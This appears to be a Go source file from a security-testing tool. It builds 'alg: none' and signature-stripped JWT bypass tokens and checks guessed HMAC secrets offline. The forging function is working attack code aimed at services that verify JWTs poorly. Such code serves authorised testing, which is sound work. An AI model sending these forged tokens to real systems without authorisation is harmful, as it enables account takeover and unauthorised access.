package authbypass

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/golang-jwt/jwt/v5"
)

// looksLikeJWT reports whether token has the three dot-separated segments a
// JWT requires — cheap guard so the tamper/verify helpers below aren't
// handed an opaque non-JWT bearer token (e.g. a plain API key).
func looksLikeJWT(token string) bool {
	return len(strings.Split(token, ".")) == 3
}

// tamperAlgNone returns two classic "alg: none" bypass variants of token:
// the header rewritten to alg: none with an empty signature segment, and the
// original header left untouched but the signature segment emptied
// (bare signature-stripping). Both are built by direct base64url
// manipulation, not golang-jwt's signing path — deliberately: the library
// requires an explicit "unsafe" opt-in to even construct an alg: none token,
// which is the right default for signing real tokens but gets in the way of
// simply reproducing the bypass string a real attacker would send.
func tamperAlgNone(token string) (algNone, sigStripped string, err error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", fmt.Errorf("authbypass: token is not a 3-segment JWT")
	}
	headerJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", "", fmt.Errorf("authbypass: decoding JWT header: %w", err)
	}
	var header map[string]any
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return "", "", fmt.Errorf("authbypass: parsing JWT header: %w", err)
	}
	header["alg"] = "none"
	tamperedHeaderJSON, err := json.Marshal(header)
	if err != nil {
		return "", "", fmt.Errorf("authbypass: re-encoding JWT header: %w", err)
	}
	tamperedHeader := base64.RawURLEncoding.EncodeToString(tamperedHeaderJSON)

	algNone = tamperedHeader + "." + parts[1] + "."
	sigStripped = parts[0] + "." + parts[1] + "."
	return algNone, sigStripped, nil
}

// verifiesWithSecret reports whether token's HMAC signature validates
// against secret. Pure local cryptographic verification — no network
// request, no interaction with the target server. This is the entire
// mechanism behind the offline JWT weak-secret check: docs/follow-up.md
// explicitly requires this stay offline, never live guessing against the
// real server.
func verifiesWithSecret(token, secret string) bool {
	_, err := jwt.Parse(token, func(*jwt.Token) (any, error) {
		return []byte(secret), nil
	})
	return err == nil
}
